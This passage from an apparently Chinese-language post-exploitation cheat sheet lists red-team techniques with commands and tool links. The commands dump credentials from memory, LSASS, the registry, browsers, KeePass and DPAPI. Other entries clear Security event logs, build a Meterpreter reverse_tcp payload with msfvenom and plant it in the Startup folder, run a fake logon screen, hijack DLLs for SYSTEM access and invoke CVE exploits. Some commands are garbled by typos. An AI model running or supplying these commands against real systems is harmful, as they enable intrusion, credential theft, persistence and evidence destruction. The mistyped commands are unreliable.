href="https://github.com/Yamato-Security/WELA">https://github.com/Yamato-Security/WELA</a></p><p>日志伪造工具flog：<a href="https://github.com/mingrammer/flog">https://github.com/mingrammer/flog</a></p><h3 id="Certificate-Abuse"><a href="#Certificate-Abuse" class="headerlink" title="Certificate Abuse"></a>Certificate Abuse</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abusing Certificate</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">ceritify.exe request &#x2F;ca:dc.domain.local\DC-CA &#x2F;template:User…<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Rubeus.exe asktgy &#x2F;user:CORP\itadmin &#x2F;certificate:C:\cert.pfx &#x2F;password:password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-Memory"><a href="#Password-Mining-in-Memory" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li><code>ps -ef | grep ftp;</code></li><li><code>gdp -p ftp_id</code></li><li><code>info proc mappings</code></li><li><code>q</code></li><li><code>dump memory /tmp/mem [start] [end]</code></li><li><code>q</code></li><li><code>strings /tmp/mem | grep passw</code></li></ol><h2 id="Password-Mining-in-Memory-1"><a href="#Password-Mining-in-Memory-1" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h2><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p><ol start="2"><li></li></ol><p>在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”</p><p>并从弹出菜单中选择“创建转储文件”.</p><ol start="3"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">strings &#x2F;root&#x2F;Desktop&#x2F;iexplore.DMP | grep &quot;Authorization: Basic&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择复制 Base64 编码字符串.</p><p>在命令提示符下键入: <code>echo -ne [Base64 String] | base64 -d</code></p><h3 id="Password-Mining-in-Registry"><a href="#Password-Mining-in-Registry" class="headerlink" title="Password Mining in Registry"></a>Password Mining in Registry</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><p>打开命令并输入:</p><pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>在命令提示符下键入:</p><pre class="line-numbers language-none"><code class="language-none">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” &#x2F;v DefaultPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>请注意输出中的凭据</p><p>1. </p><p>在命令提示符下键入:</p><pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>在命令提示符下键入:</p><pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>注意输出中的凭据</li><li></li></ol><p>在命令提示符下键入:</p><pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>在命令提示符下键入:</p><pre class="line-numbers language-none"><code class="language-none">reg query HKEY_CURRENT_USER\Software\TightVNC\Server &#x2F;v PasswordViewOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>记下加密的密码并输入:</p><pre class="line-numbers language-none"><code class="language-none">C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>1. </p><p>从输出中记下凭据.</p><h3 id="Password-Mining-in-General-Events-via-SeAudit"><a href="#Password-Mining-in-General-Events-via-SeAudit" class="headerlink" title="Password Mining in General Events via SeAudit"></a>Password Mining in General Events via SeAudit</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">invoke-module LogCleaner.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-Security-Events-via-SeSecurity"><a href="#Password-Mining-in-Security-Events-via-SeSecurity" class="headerlink" title="Password Mining in Security Events via SeSecurity"></a>Password Mining in Security Events via SeSecurity</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">.&#x2F;WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">flog -s 10s -n 200<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">wevtutil cl Security<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><p>In Metasploit (msf &gt; prompt) 输入: <code>use multi/handler</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>set payload windows/meterpreter/reverse_tcp</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>set lhost [Kali VM IP Address]</code></p><p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p><p>打开另一个命令提示符并键入:</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;[Kali VM IP Address] -f exe -o x.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li></li></ol><pre class="line-numbers language-none"><code class="language-none">将 x.exe 放在“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-McAfeeSitelistFiles"><a href="#Password-Mining-in-McAfeeSitelistFiles" class="headerlink" title="Password Mining in McAfeeSitelistFiles"></a>Password Mining in McAfeeSitelistFiles</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpUp.exe McAfeeSitelistFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p><h3 id="Password-Mining-in-CachedGPPPassword"><a href="#Password-Mining-in-CachedGPPPassword" class="headerlink" title="Password Mining in CachedGPPPassword"></a>Password Mining in CachedGPPPassword</h3><p>域名: Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpUp.exe CachedGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-DomainGPPPassword"><a href="#Password-Mining-in-DomainGPPPassword" class="headerlink" title="Password Mining in DomainGPPPassword"></a>Password Mining in DomainGPPPassword</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpUp.exe domianGPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-KeePass"><a href="#Password-Mining-in-KeePass" class="headerlink" title="Password Mining in KeePass"></a>Password Mining in KeePass</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe keepass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">KeeTheft.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：</p><p>seatbelt：<a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p><p>KeeTheft未找到</p><h3 id="Password-Mining-in-WindowsVault"><a href="#Password-Mining-in-WindowsVault" class="headerlink" title="Password Mining in WindowsVault"></a>Password Mining in WindowsVault</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe WindowsVault<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-SecPackageCreds"><a href="#Password-Mining-in-SecPackageCreds" class="headerlink" title="Password Mining in SecPackageCreds"></a>Password Mining in SecPackageCreds</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe SecPackageCreds<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-PuttyH操作系统tKeys"><a href="#Password-Mining-in-PuttyH操作系统tKeys" class="headerlink" title="Password Mining in PuttyH操作系统tKeys"></a>Password Mining in PuttyH操作系统tKeys</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe PuttyHostKeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-RDCManFiles"><a href="#Password-Mining-in-RDCManFiles" class="headerlink" title="Password Mining in RDCManFiles"></a>Password Mining in RDCManFiles</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDCManFiles<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-RDPSavedConnections"><a href="#Password-Mining-in-RDPSavedConnections" class="headerlink" title="Password Mining in RDPSavedConnections"></a>Password Mining in RDPSavedConnections</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">Seatbelt.exe RDPSavedConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Password-Mining-in-MasterKeys"><a href="#Password-Mining-in-MasterKeys" class="headerlink" title="Password Mining in MasterKeys"></a>Password Mining in MasterKeys</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpDPAPI masterkeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/GhostPack/SharpDPAPI">https://github.com/GhostPack/SharpDPAPI</a></p><h3 id="Password-Mining-in-Browsers"><a href="#Password-Mining-in-Browsers" class="headerlink" title="Password Mining in Browsers"></a>Password Mining in Browsers</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpWeb.exe all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2">https://github.com/djhohnstein/SharpWeb/releases/tag/v1.2</a></p><h3 id="Password-Mining-in-Files"><a href="#Password-Mining-in-Files" class="headerlink" title="Password Mining in Files"></a>Password Mining in Files</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SauronEye.exe -d C:\Users\vincent\Desktop\ –filetypes .txt .doc .docx .xls –contents –keywords password pass* -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/vivami/SauronEye/releases/tag/v0.0.9">https://github.com/vivami/SauronEye/releases/tag/v0.0.9</a></p><h3 id="Password-Mining-in-LDAP"><a href="#Password-Mining-in-LDAP" class="headerlink" title="Password Mining in LDAP"></a>Password Mining in LDAP</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">SharpLDAPSearch.exe &quot;(&amp;(objectClass&#x3D;user)(cn&#x3D;*svc*))&quot; &quot;sam用户名&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-DomainComputer COMPUTER -Properties ms-mcs-AdmPwd,ComputerName,ms-mcs-AdmPwdExpirationTime<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>批注：</p><p>sharpldapsearch：<a href="https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2">https://github.com/mitchmoser/SharpLDAPSearch/releases/tag/v1.2</a></p><p>powerview：好多个版本，应该是这个吧？<a href="https://github.com/ericshoemaker/PowerView">https://github.com/ericshoemaker/PowerView</a></p><h3 id="Password-Mining-in-Clipboard"><a href="#Password-Mining-in-Clipboard" class="headerlink" title="Password Mining in Clipboard"></a>Password Mining in Clipboard</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">execute-assembly &#x2F;root&#x2F;SharpClipHistory.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0">https://github.com/FSecureLABS/SharpClipHistory/releases/tag/v1.0</a></p><h3 id="Password-Mining-in-GMSA-Password"><a href="#Password-Mining-in-GMSA-Password" class="headerlink" title="Password Mining in GMSA Password"></a>Password Mining in GMSA Password</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunt</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">GMSAPasswordReader.exe –accountname SVC_SERVICE_ACCOUNT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/rvazarkar/GMSAPasswordReader">https://github.com/rvazarkar/GMSAPasswordReader</a></p><h3 id="Delegate-tokens-via-RDP"><a href="#Delegate-tokens-via-RDP" class="headerlink" title="Delegate tokens via RDP"></a>Delegate tokens via RDP</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows&#x2F;Linux</p><p>类型:  Delegate tokens</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">.&#x2F;fake_rdp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Or</p><pre class="line-numbers language-none"><code class="language-none">pyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：</p><p>fake_rdp：<a href="https://github.com/cheeseandcereal/fake-rdp">https://github.com/cheeseandcereal/fake-rdp</a></p><p>pyrdp-mitm未找到QAQ</p><h3 id="Delegate-tokens-via-FTP"><a href="#Delegate-tokens-via-FTP" class="headerlink" title="Delegate tokens via FTP"></a>Delegate tokens via FTP</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows&#x2F;Linux</p><p>类型:  Delegate tokens</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">FakeFtpServer fakeFtpServer &#x3D; new FakeFtpServer();fakeFtpServer.addUserAccount(new UserAccount(“user”, “password”, “c:\\data”));FileSystem fileSystem &#x3D; new WindowsFakeFileSystem();fileSystem.add(new DirectoryEntry(“c:\\data”));fileSystem.add(new FileEntry(“c:\\data\\file1.txt”, “abcdef 1234567890”));fileSystem.add(new FileEntry(“c:\\data\\run.exe”));fakeFtpServer.setFileSystem(fileSystem);  fakeFtpServer.start();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Fake-Logon-Screen"><a href="#Fake-Logon-Screen" class="headerlink" title="Fake Logon Screen"></a>Fake Logon Screen</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Delegate tokens</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">execute-assembly fakelogonscreen.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1">https://github.com/bitsadmin/fakelogonscreen/releases/tag/1.1</a></p><h3 id="Abusing-WinRM-Services"><a href="#Abusing-WinRM-Services" class="headerlink" title="Abusing WinRM Services"></a>Abusing WinRM Services</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Abuse Service</p><p>方法: </p><ol><li></li></ol><pre class="line-numbers language-none"><code class="language-none">RogueWinRM.exe -p C:\windows\system32\cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>批注：<a href="https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1">https://github.com/antonioCoco/RogueWinRM/releases/tag/1.1</a></p><h3 id="Dump-lsass-with-SilentProcessExit"><a href="#Dump-lsass-with-SilentProcessExit" class="headerlink" title="Dump lsass with SilentProcessExit"></a>Dump lsass with SilentProcessExit</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunting</p><p>方法: </p><ol><li><code>SilentProcessExit.exe pid</code></li></ol><p>批注：<a href="https://github.com/deepinstinct/LsassSilentProcessExit">https://github.com/deepinstinct/LsassSilentProcessExit</a></p><h3 id="Lsass-Shtinkering"><a href="#Lsass-Shtinkering" class="headerlink" title="Lsass Shtinkering"></a>Lsass Shtinkering</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunting</p><p>方法: </p><ol><li><code>HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps-&gt;2</code></li><li><code>LSASS_Shtinkering.exe pid</code></li></ol><p>批注：<a href="https://github.com/deepinstinct/Lsass-Shtinkering">https://github.com/deepinstinct/Lsass-Shtinkering</a></p><h3 id="AndrewSpecial"><a href="#AndrewSpecial" class="headerlink" title="AndrewSpecial"></a>AndrewSpecial</h3><p>域: No</p><p>Local Admin: Yes</p><p>操作系统: Windows</p><p>类型:  Enumeration &amp; Hunting</p><p>方法： </p><ul><li><code>AndrewSpecial.exe</code></li></ul><p>批注：<a href="https://github.com/hoangprod/AndrewSpecial">https://github.com/hoangprod/AndrewSpecial</a></p><h3 id="CCACHE-ticket-reuse-from-x2F-tmp"><a href="#CCACHE-ticket-reuse-from-x2F-tmp" class="headerlink" title="CCACHE ticket reuse from &#x2F;tmp"></a>CCACHE ticket reuse from &#x2F;tmp</h3><p>域: Yes</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Enumeration &amp; Hunting</p><p>方法: </p><ul><li><code>ls /tmp/ | grep krb5cc_X</code></li><li><code>export KRB5CCNAME=/tmp/krb5cc_X</code></li></ul><h3 id="CCACHE-ticket-reuse-from-keyring"><a href="#CCACHE-ticket-reuse-from-keyring" class="headerlink" title="CCACHE ticket reuse from keyring"></a>CCACHE ticket reuse from keyring</h3><p>域: Yes</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Enumeration &amp; Hunting</p><p>方法: </p><ul><li><code>https://github.com/TarlogicSecurity/tickey</code></li><li><code>/tmp/tickey -i</code></li></ul><h3 id="CCACHE-ticket-reuse-from-SSSD-KCM"><a href="#CCACHE-ticket-reuse-from-SSSD-KCM" class="headerlink" title="CCACHE ticket reuse from SSSD KCM"></a>CCACHE ticket reuse from SSSD KCM</h3><p>域: Yes</p><p>Local Admin: Yes</p><p>操作系统: Linux</p><p>类型:  Enumeration &amp; Hunting</p><p>方法： </p><ul><li><code>git clone https://github.com/fireeye/SSSDKCMExtractor</code></li><li><code>python3 SSSDKCMExtractor.py –database secrets.ldb –key secrets.mkey</code></li></ul><h3 id="CCACHE-ticket-reuse-from-keytab"><a href="#CCACHE-ticket-reuse-from-keytab" class="headerlink" title="CCACHE ticket reuse from keytab"></a>CCACHE ticket reuse from keytab</h3><p>域: Yes</p><p>Local Admin: Yes</p><p>操作系统： Linux&#x2F;Windows&#x2F;Mac</p><p>类型：  Enumeration &amp; Hunting</p><p>方法： </p><ul><li><code>git clone https://github.com/its-a-feature/KeytabParser</code></li><li><code>python KeytabParser.py /etc/krb5.keytab</code></li><li><code>klist -k /etc/krb5.keytab</code></li></ul><p>Or</p><ul><li><code>klist.exe -t -K -e -k FILE:C:\Users\User\downloads\krb5.keytab</code></li><li><code>python3 keytabextract.py krb5.keytab</code></li><li><code>./bifrost -action dump -source keytab -path test</code></li></ul><h3 id="SSH-Forwarder"><a href="#SSH-Forwarder" class="headerlink" title="SSH Forwarder"></a>SSH Forwarder</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Linux</p><p>类型：  Enumeration &amp; Hunting</p><p>方法： </p><ul><li>转发代理 yes<code>ForwardAgent yes</code></li><li><code>SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston</code></li></ul><p>AppleScript</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Enumeration &amp; Hunt</p><p>方法： </p><ul><li>(EmPyre) &gt; <code>listeners</code></li><li>(EmPyre: listeners) &gt; <code>set Name mylistener</code></li><li>(EmPyre: listeners) &gt; <code>execute</code></li><li>(EmPyre: listeners) &gt; <code>usestager applescript mylistener</code></li><li>(EmPyre: stager&#x2F;applescript) &gt; <code>execute</code></li></ul><p>批注：这个工具我找了半天，发现这是个七八年前的一个工具</p><p>链接地址<a href="https://github.com/EmpireProject/EmPyre">https://github.com/EmpireProject/EmPyre</a></p><h3 id="DLL-Search-Order-Hijacking"><a href="#DLL-Search-Order-Hijacking" class="headerlink" title="DLL Search Order Hijacking"></a>DLL Search Order Hijacking</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Hijack</p><p>方法： </p><ul><li><code>https://github.com/slaeryan/AQUARMOURY/tree/master/Brownie</code></li><li>运行<code>Brownie</code></li></ul><h3 id="Slui-File-Handler-Hijack-LPE"><a href="#Slui-File-Handler-Hijack-LPE" class="headerlink" title="Slui File Handler Hijack LPE"></a>Slui File Handler Hijack LPE</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Hijack</p><p>方法： </p><ul><li><code>https://github.com/bytecode77/slui-file-handler-hijack-privilege-escalation</code></li><li><code>Slui.exe</code></li></ul><h3 id="CDPSvc-DLL-Hijacking"><a href="#CDPSvc-DLL-Hijacking" class="headerlink" title="CDPSvc DLL Hijacking"></a>CDPSvc DLL Hijacking</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Hijack</p><p>方法： </p><ul><li><code>Cdpsgshims.exe</code></li></ul><h3 id="Magnify-exe-Dll-Search-Order-Hijacking"><a href="#Magnify-exe-Dll-Search-Order-Hijacking" class="headerlink" title="Magnify.exe Dll Search Order Hijacking"></a>Magnify.exe Dll Search Order Hijacking</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Hijack</p><p>方法： </p><ul><li><code>将有效负载 dll 作为 igdgmm64.dll 复制到可写的系统路径 %PATH%，例如 C:\python27</code></li><li>按Win键+L</li><li>按回车键</li><li><code>在显示密码框的登录屏幕上按 WinKey++(plusKey).</code></li><li><code>然后payload dll将以系统访问权限执行.</code></li></ul><h3 id="CdpSvc-Service"><a href="#CdpSvc-Service" class="headerlink" title="CdpSvc Service"></a>CdpSvc Service</h3><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Hijack</p><p>方法： </p><ul><li><code>使用 acltest.ps1 查找可写系统路径（例如 C:\python27）</code></li><li><code>C:\CdpSvcLPE&gt; powershell -ep bypass “..\acltest.ps1”</code></li><li>将 <code>cdpsgshims.dll</code>复制到 <code>C:\python27</code></li><li>创建 <code>C:\temp</code> 文件夹并将 <code>impersonate.bin</code> 复制到 <code>C:\temp</code></li><li><code>C:\CdpSvcLPE&gt; mkdir C:\temp</code></li><li><code>C:\CdpSvcLPE&gt; copy impersonate.bin C:\temp</code></li><li>重新启动（或以管理员身份停止&#x2F;启动 CDPSvc）</li><li><code>cmd 将提示 nt authority\system。</code></li></ul><h3 id="HiveNightmare"><a href="#HiveNightmare" class="headerlink" title="HiveNightmare"></a>HiveNightmare</h3><p>域：Yes</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>HiveNightmare.exe 200</code></li></ul><p>CVE-2021-30655</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>https://github.com/thehappydinoa/rootOS</code></li><li><code>Python rootOS.py</code></li></ul><p>CVE-2019-8526</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Mac</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>https://github.com/amanszpapaya/MacPer</code></li><li><code>Python main.py</code></li></ul><p>CVE-2020-9771</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Mac</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>https://github.com/amanszpapaya/MacPer</code></li><li><code>Python main.py</code></li></ul><p>CVE-2021-3156</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Mac</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>https://github.com/amanszpapaya/MacPer</code></li><li><code>Python main.py</code></li></ul><p>CVE-2018-4280</p><p>域：No</p><p>Local Admin: Yes</p><p>操作系统： Mac</p><p>类型：  0&#x2F;1 Exploit</p><p>方法： </p><ul><li><code>https://github.com/bazad/launchd-portrep</code></li><li><code>./launchd-portrep ‘touch /tmp/exploit-success’=</code></li></ul><h3 id="Abusing-with-FileRestorePrivilege"><a href="#Abusing-with-FileRestorePrivilege" class="headerlink" title="Abusing with FileRestorePrivilege"></a>Abusing with FileRestorePrivilege</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Abuse Privilege</p><p>方法： </p><ul><li><code>poptoke.exe</code></li></ul><h3 id="Abusing-with-RestoreAndBackupPrivileges"><a href="#Abusing-with-RestoreAndBackupPrivileges" class="headerlink" title="Abusing with RestoreAndBackupPrivileges"></a>Abusing with RestoreAndBackupPrivileges</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Abuse Privilege</p><p>方法： </p><ul><li><code>poptoke.exe</code></li></ul><h3 id="Abusing-with-ShadowCopyBackupPrivilege"><a href="#Abusing-with-ShadowCopyBackupPrivilege" class="headerlink" title="Abusing with ShadowCopyBackupPrivilege"></a>Abusing with ShadowCopyBackupPrivilege</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Abuse Privilege</p><p>方法： </p><ul><li><code>poptoke.exe</code></li></ul><h3 id="Abusing-with-ShadowCopy"><a href="#Abusing-with-ShadowCopy" class="headerlink" title="Abusing with ShadowCopy"></a>Abusing with ShadowCopy</h3><p>域：Y&#x2F;N</p><p>Local Admin: Yes</p><p>操作系统： Windows</p><p>类型：  Abuse Privilege</p><p>方法： </p><ul><li><code>poptoke.exe</code></li></ul><p>批注：我找了很多，感觉最像是的应该是这个工具</p><p>链接<a 